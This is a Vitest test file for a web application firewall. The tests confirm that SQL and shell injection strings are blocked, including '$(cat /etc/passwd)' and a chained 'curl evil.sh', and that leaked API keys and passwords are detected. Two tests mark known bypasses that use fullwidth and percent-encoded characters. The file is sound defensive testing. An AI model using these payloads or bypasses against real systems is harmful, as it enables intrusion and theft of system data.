import { describe, it, expect } from "vitest";
import { checkInjectionPatterns, checkOutputLeakage } from "../src/security/waf.js";

describe("checkInjectionPatterns", () => {
  it("blocks SQL DROP injection", () => {
    expect(checkInjectionPatterns("x'; DROP TABLE users; --").blocked).toBe(true);
  });

  it("blocks UNION SELECT", () => {
    expect(checkInjectionPatterns("1 UNION SELECT password FROM users").blocked).toBe(true);
    expect(checkInjectionPatterns("1 UNION ALL SELECT * FROM t").blocked).toBe(true);
  });

  it("blocks SQL tautology", () => {
    expect(checkInjectionPatterns("' OR '1'='1").blocked).toBe(true);
  });

  it("blocks shell substitution and command chaining", () => {
    expect(checkInjectionPatterns("$(cat /etc/passwd)").blocked).toBe(true);
    expect(checkInjectionPatterns("`id`").blocked).toBe(true);
    expect(checkInjectionPatterns("a && curl evil.sh").blocked).toBe(true);
  });

  it("passes benign input", () => {
    expect(checkInjectionPatterns("how does assembleContext rank files").blocked).toBe(false);
    expect(checkInjectionPatterns("src/retrieval/context.ts").blocked).toBe(false);
  });

  // Known gaps (Phase 2 backlog: NFKC normalization + percent-decoding before matching)
  it.fails("blocks fullwidth-unicode tautology (KNOWN GAP)", () => {
    expect(checkInjectionPatterns("＇ OR ＇1＇=＇1").blocked).toBe(true);
  });

  it.fails("blocks percent-encoded tautology (KNOWN GAP)", () => {
    expect(checkInjectionPatterns("%27%20OR%20%271%27%3D%271").blocked).toBe(true);
  });
});

describe("checkOutputLeakage", () => {
  it("detects OpenAI-style API keys", () => {
    expect(checkOutputLeakage("key: sk-abcdefghijklmnopqrstuv").length).toBeGreaterThan(0);
  });

  it("detects AWS access keys", () => {
    expect(checkOutputLeakage("AKIAIOSFODNN7EXAMPLE").length).toBeGreaterThan(0);
  });

  it("detects PEM private keys", () => {
    expect(checkOutputLeakage("-----BEGIN RSA PRIVATE KEY-----").length).toBeGreaterThan(0);
  });

  it("detects generic password assignments", () => {
    expect(checkOutputLeakage('password = "hunter2hunter2"').length).toBeGreaterThan(0);
  });

  it("passes clean source code", () => {
    expect(checkOutputLeakage("export function decompress(blob: Buffer): string {")).toEqual([]);
  });
});
